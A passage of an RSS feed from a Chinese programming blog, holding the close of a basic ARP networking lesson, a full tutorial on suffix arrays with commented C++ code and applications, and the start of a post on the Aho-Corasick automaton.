&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;arp -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;? (192.168.110.13) at 00:0c:29:90:e6:8d [ether] on eth0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;6.ARP 的请求是一直不间断的在自动发送的，一台计算机会通信进行以下过程&lt;/p&gt;
&lt;p&gt;1. 主动询问网段下的 IP 的 MAC 地址&lt;/p&gt;
&lt;p&gt;2. 主动告诉别人我的 IP 和 MAC 地址&lt;/p&gt;
&lt;p&gt;3. 根据应答结果实时更新 ARP 表的绑定关系&lt;/p&gt;
&lt;h2 id=&#34;六课堂总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#六课堂总结&#34;&gt;#&lt;/a&gt; 六。课堂总结&lt;/h2&gt;
&lt;p&gt;1.ARP 协议负责将 IP 地址转换为 MAC 地址。或者说 ARP 协议负责将 IP 地址和 MAC 地址进行绑定。&lt;/p&gt;
&lt;p&gt;2.ARP 协议的主要工作就是建立、查询、更新、删除 ARP 表项。&lt;/p&gt;
&lt;p&gt;3.ARP 的特性：无需人为干预，一直在进行轮询和应答&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/</guid>
            <title>CPP后缀数组</title>
            <link>https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/</link>
            <pubDate>Sat, 14 Jan 2023 04:10:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;为什么学后缀数组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么学后缀数组&#34;&gt;#&lt;/a&gt; 为什么学后缀数组&lt;/h1&gt;
&lt;p&gt;后缀数组是一个比较强大的处理字符串的算法，是有关字符串的基础算法，所以必须掌握。&lt;br /&gt;
学会后缀自动机 (SAM) 就不用学后缀数组 (SA) 了？不，虽然 SAM 看起来更为强大和全面，但是有些 SAM 解决不了的问题能被 SA 解决，只掌握 SAM 是远远不够的。&lt;/p&gt;
&lt;p&gt;有什么 SAM 做不了的例子？&lt;br /&gt;
比如果求一个串后缀的 lcp 方面的应用，这是 SA 可以很方便的用 rmq 来维护，但是 SAM 还要求 lca，比较麻烦，还有就是字符集比较大的时候 SA 也有优势。&lt;/p&gt;
&lt;p&gt;现在这里放道题，看完这个 blog 可能就会做了！：&lt;br /&gt;
你可想想这道题：你有一个 01 串 S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有 q 多个询问，每个询问结束位置在 l~r 中不同前缀的最长公共后缀是多长？&lt;br /&gt;
|S|,q≤100000|S|,q≤100000&lt;/p&gt;
&lt;p&gt;时限 4s&lt;/p&gt;
&lt;p&gt;而下面是我对后缀数组的一些理解&lt;/p&gt;
&lt;h1 id=&#34;构造后缀数组sa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#构造后缀数组sa&#34;&gt;#&lt;/a&gt; 构造后缀数组 ——SA&lt;/h1&gt;
&lt;h2 id=&#34;先定义一些变量的含义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#先定义一些变量的含义&#34;&gt;#&lt;/a&gt; 先定义一些变量的含义&lt;/h2&gt;
&lt;p&gt;Str ：需要处理的字符串 (长度为 Len)&lt;br /&gt;
 Suffix [i] ：Str 下标为 i ~ Len 的连续子串 (即后缀)&lt;br /&gt;
 Rank [i] : Suffix [i] 在所有后缀中的排名&lt;br /&gt;
 SA [i] : 满足 Suffix [SA [1]] &amp;lt; Suffix [SA [2]] …… &amp;lt; Suffix [SA [Len]], 即排名为 i 的后缀为 Suffix [SA [i]] (与 Rank 是互逆运算)&lt;br /&gt;
 好，来形象的理解一下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20160205125505545&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;后缀数组指的就是这个 SA [i], 有了它，我们就可以实现一些很强大的功能 (如不相同子串个数、连续重复子串等)。如何快速的到它，便成为了这个算法的关键。而 SA 和 Rank 是互逆的，只要求出任意一个，另一个就可以 O (Len) 得到。&lt;br /&gt;
现在比较主流的算法有两种，倍增和 DC3，在这里，就主要讲一下稍微慢一些，但比较好实现以及理解的倍增算法 (虽说慢，但也是 O (Len logLen)) 的。&lt;/p&gt;
&lt;h2 id=&#34;进入正题倍增算法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进入正题倍增算法&#34;&gt;#&lt;/a&gt; 进入正题 —— 倍增算法&lt;/h2&gt;
&lt;p&gt;倍增算法的主要思想 ：对于一个后缀 Suffix [i], 如果想直接得到 Rank 比较困难，但是我们可以对每个字符开始的长度为 2k2k 的字符串求出排名，k 从 0 开始每次递增 1 (每递增 1 就成为一轮)，当 2k2k 大于 Len 时，所得到的序列就是 Rank，而 SA 也就知道了。O (logLen) 枚举 k&lt;br /&gt;
 这样做有什么好处呢？&lt;br /&gt;
设每一轮得到的序列为 rank (注意 r 是小写，最终后缀排名 Rank 是大写)。有一个很美妙的性质就出现了！第 k 轮的 rank 可由第 k - 1 轮的 rank 快速得来！&lt;br /&gt;
 为什么呢？为了方便描述，设 SubStr (i, len) 为从第 i 个字符开始，长度为 len 的字符串我们可以把第 k 轮 SubStr (i, 2k2k) 看成是一个由 SubStr (i, 2k−12k−1) 和 SubStr (i + 2k−12k−1, 2k−12k−1) 拼起来的东西。类似 rmq 算法，这两个长度而 2k−12k−1 的字符串是上一轮遇到过的！当然上一轮的 rank 也知道！那么吧每个这一轮的字符串都转化为这种形式，并且大家都知道字符串的比较是从左往右，左边和右边的大小我们可以用上一轮的 rank 表示，那么…… 这不就是一些两位数 (也可以视为第一关键字和第二关键字) 比较大小吗！再把这些两位数重新排名就是这一轮的 rank。&lt;br /&gt;
我们用下面这张经典的图理解一下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20160205125603928&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;相信只要理解字符串的比较法则 (跟实数差不多)，理解起来并不难。# 还有一个细节就是怎么把这些两位数排序？这种位数少的数进行排序毫无疑问的要用一个复杂度为长度 * 排序数的个数的优美算法 —— 基数排序 (对于两位数的数复杂度就是 O (Len) 的)。&lt;br /&gt;
基数排序原理 ： 把数字依次按照由低位到高位依次排序，排序时只看当前位。对于每一位排序时，因为上一位已经是有序的，所以这一位相等或符合大小条件时就不用交换位置，如果不符合大小条件就交换，实现可以用” 桶” 来做。(叙说起来比较奇怪，看完下面的代码应该更好理解，也可以上网查有关资料)&lt;br /&gt;
 好了 SA 和 Rank (大写 R) 到此为止就处理好了。(下面有详解代码！)。但我们发现，只有这两样东西好像没什么用，为了处理重复子串之类的问题，我们就要引入一个表示最长公共前缀的新助手 Height 数组！&lt;/p&gt;
&lt;h1 id=&#34;构造最长公共前缀height&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#构造最长公共前缀height&#34;&gt;#&lt;/a&gt; 构造最长公共前缀 ——Height&lt;/h1&gt;
&lt;h2 id=&#34;同样先是定义一些变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同样先是定义一些变量&#34;&gt;#&lt;/a&gt; 同样先是定义一些变量&lt;/h2&gt;
&lt;p&gt;Heigth [i] : 表示 Suffix [SA [i]] 和 Suffix [SA [i - 1]] 的最长公共前缀，也就是排名相邻的两个后缀的最长公共前缀&lt;br /&gt;
 H [i] : 等于 Height [Rank [i]]，也就是后缀 Suffix [i] 和它前一名的后缀的最长公共前缀&lt;br /&gt;
而两个排名不相邻的最长公共前缀定义为排名在它们之间的 Height 的最小值。&lt;br /&gt;
跟上面一样，先形像的理解一下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20160205125636006&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;高效地得到height数组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#高效地得到height数组&#34;&gt;#&lt;/a&gt; 高效地得到 Height 数组&lt;/h2&gt;
&lt;p&gt;如果一个一个数按 SA 中的顺序比较的话复杂度是 O (N2N2) 级别的，想要快速的得到 Height 就需要用到一个关于 H 数组的性质。&lt;br /&gt;
H[i] ≥ H[i - 1] - 1!&lt;br /&gt;
 如果上面这个性质是对的，那我们可以按照 H [1]、H [2]……H [Len] 的顺序进行计算，那么复杂度就降为 O (N) 了！&lt;br /&gt;
让我们尝试一下证明这个性质：设 Suffix [k] 是排在 Suffix [i - 1] 前一名的后缀，则它们的最长公共前缀是 H [i - 1]。都去掉第一个字符，就变成 Suffix [k + 1] 和 Suffix [i]。如果 H [i - 1] = 0 或 1, 那么 H [i] ≥ 0 显然成立。否则，H [i] ≥ H [i - 1] - 1 (去掉了原来的第一个，其他前缀一样相等)，所以 Suffix [i] 和在它前一名的后缀的最长公共前缀至少是 H [i - 1] - 1。&lt;br /&gt;
仔细想想还是比较好理解的。H 求出来，那 Height 就相应的求出来了，这样结合 SA，Rank 和 Height 我们就可以做很多关于字符串的题了！&lt;/p&gt;
&lt;h1 id=&#34;代码code&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码code&#34;&gt;#&lt;/a&gt; 代码 ——Code&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Problem: JZOJ1598(询问一个字符串中有多少至少出现两次的子串)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Content: SA&amp;#x27;s Code and Explanation&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Author : YxuanwKeith&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const int MAXN = 100005;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char ch[MAXN], All[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int SA[MAXN], rank[MAXN], Height[MAXN], tax[MAXN], tp[MAXN], a[MAXN], n, m; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char str[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//rank[i] 第i个后缀的排名; SA[i] 排名为i的后缀位置; Height[i] 排名为i的后缀与排名为(i-1)的后缀的LCP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//tax[i] 计数排序辅助数组; tp[i] rank的辅助数组(计数排序中的第二关键字),与SA意义一样。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//a为原串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void RSort() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //rank第一关键字,tp第二关键字。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt;= m; i ++) tax[i] = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 1; i &amp;lt;= n; i ++) tax[rank[tp[i]]] ++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 1; i &amp;lt;= m; i ++) tax[i] += tax[i-1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = n; i &amp;gt;= 1; i --) SA[tax[rank[tp[i]]] --] = tp[i]; //确保满足第一关键字的同时，再满足第二关键字的要求&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; //计数排序,把新的二元组排序。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int cmp(int *f, int x, int y, int w) &amp;#123; return f[x] == f[y] &amp;amp;&amp;amp; f[x + w] == f[y + w]; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//通过二元组两个下标的比较，确定两个子串是否相同&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Suffix() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //SA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 1; i &amp;lt;= n; i ++) rank[i] = a[i], tp[i] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m = 127 ,RSort(); //一开始是以单个字符为单位，所以(m = 127)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int w = 1, p = 1, i; p &amp;lt; n; w += w, m = p) &amp;#123; //把子串长度翻倍,更新rank&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //w 当前一个子串的长度; m 当前离散后的排名种类数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //当前的tp(第二关键字)可直接由上一次的SA的得到&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (p = 0, i = n - w + 1; i &amp;lt;= n; i ++) tp[++ p] = i; //长度越界,第二关键字为0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (i = 1; i &amp;lt;= n; i ++) if (SA[i] &amp;gt; w) tp[++ p] = SA[i] - w;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //更新SA值,并用tp暂时存下上一轮的rank(用于cmp比较)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        RSort(), swap(rank, tp), rank[SA[1]] = p = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //用已经完成的SA来更新与它互逆的rank,并离散rank&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (i = 2; i &amp;lt;= n; i ++) rank[SA[i]] = cmp(tp, SA[i], SA[i - 1], w) ? p : ++ p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //离散：把相等的字符串的rank设为相同。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //LCP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int j, k = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i = 1; i &amp;lt;= n; Height[rank[i ++]] = k) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for( k = k ? k - 1 : k, j = SA[rank[i] - 1]; a[i + k] == a[j + k]; ++ k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //这个知道原理后就比较好理解程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Init() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%s&amp;quot;, str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    n = strlen(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; n; i ++) a[i + 1] = str[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Init();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Suffix();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int ans = Height[2];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 3; i &amp;lt;= n; i ++) ans += max(Height[i] - Height[i - 1], 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;, ans);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;4个比较基础的应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4个比较基础的应用&#34;&gt;#&lt;/a&gt; 4 个比较基础的应用&lt;/h1&gt;
&lt;p&gt;Q1：一个串中两个串的最大公共前缀是多少？&lt;br /&gt;
A1：这不就是 Height 吗？用 rmq 预处理，再 O (1) 查询。&lt;/p&gt;
&lt;p&gt;Q2：一个串中可重叠的重复最长子串是多长？&lt;br /&gt;
A2：就是求任意两个后缀的最长公共前缀，而任意两个后缀的最长公共前缀都是 Height 数组里某一段的最小值，那最长的就是 Height 中的最大值。&lt;/p&gt;
&lt;p&gt;Q3：一个串种不可重叠的重复最长子串是多长？&lt;br /&gt;
A3：先二分答案，转化成判别式的问题比较好处理。假设当前需要判别长度为 k 是否符合要求，只需把排序后的后缀分成若干组，其中每组的后缀之间的 Height 值都不小于 k，再判断其中有没有不重复的后缀，具体就是看最大的 SA 值和最小的 SA 值相差超不超过 k，有一组超过的话 k 就是合法答案。&lt;/p&gt;
&lt;p&gt;A4：一个字符串不相等的子串的个数是多少？&lt;br /&gt;
Q4：每个子串一定是某个后缀的前缀，那么原问题等价于求所有后缀之间的不相同的前缀的个数。而且可以发现每一个后缀 Suffix [SA [i]] 的贡献是 Len - SA [i] + 1, 但是有子串算重复，重复的就是 Heigh [i] 个与前面相同的前缀，那么减去就可以了。最后，一个后缀 Suffix [SA [i]] 的贡献就是 Len - SA [k] + 1 - Height [k]。&lt;br /&gt;
对于后缀数组更多的应用这里就不详细阐述，经过思考后每个人都会发现它的一些不同的用途，它的功能也许比你想象中的更强大！&lt;/p&gt;
&lt;h1 id=&#34;最开始的那道题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最开始的那道题&#34;&gt;#&lt;/a&gt; 最开始的那道题&lt;/h1&gt;
&lt;p&gt;先搬下来。。。&lt;/p&gt;
&lt;p&gt;你可想想这道题：你有一个 01 串 S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有很多个询问，每 q 个询问结束位置在 l~r 中不同前缀的最长公共后缀是多长？&lt;br /&gt;
|S|,q≤100000&lt;br /&gt;
 时限 4s&lt;/p&gt;
&lt;p&gt;简单思路：首先可以把字符串反过来就是求后缀的最长公共前缀了，可以用 SA 求出 height 数组，然后用 rmq 预处理之后就是求两个位置间的最小值。然后对于一个区间，显然只有在 SA 数组中相邻的两个串可以贡献答案。&lt;br /&gt;
对于区间询问的问题可以用莫队处理，然后考虑加入一个后缀应该怎么处理，我们可以维护一个按 SA 数组排序的链表。假设我们先把所有位置的 SA 全部加入，然后按顺序删除，重新按顺序加入时就可以 O (1) 完成修改。那么按照这个思路我们可以用固定左端点的并查集，做到只加入，不删除，然后用 O (n√n+nlogn) O (nn+nlogn) 的复杂度完成这道题。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;可能后面的处理方式比较麻烦，如果直接用 splay 维护区间中的后缀的话可以做到 O (n√n&lt;/em&gt;logn) O (nnlogn)，这个方法就比较直观，而 SAM 在个问题上还是有点无力的。这题只是为了说明 SA 相比于 SAM 还是有他的独到之处，特别是在处理后缀的 lcp 之类的问题上。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/</guid>
            <title>CPP算法AC自动机</title>
            <link>https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/</link>
            <pubDate>Sat, 14 Jan 2023 04:00:23 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;首先给定模式串 &amp;quot;ash&amp;quot;,&amp;quot;shex&amp;quot;,&amp;quot;bcd&amp;quot;,&amp;quot;sha&amp;quot;, 然后我们根据模式串建立如下 trie 树:&lt;br /&gt;
&lt;img data-src=&#34;https://img-blog.csdn.net/20181006092249946?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后我们再了解下一步:&lt;br /&gt;
ac 自动机，就是在 tire 树的基础上，增加一个 fail 指针，如果当前点匹配失败，则将指针转移到 fail 指针指向的地方，这样就不用回溯，而可以路匹配下去了.(当前模式串后缀和 fail 指针指向的模式串部分前缀相同，如 abce 和 bcd, 我们找到 c 发现下一个要找的不是 e, 就跳到 bcd 中的 c 处，看看此处的下一个字符 (d) 是不是应该找的那一个)&lt;/p&gt;
&lt;p&gt;一般，fail 指针的构建都是用 bfs 实现的&lt;br /&gt;
首先每个模式串的首字母肯定是指向根节点的&lt;/p&gt;
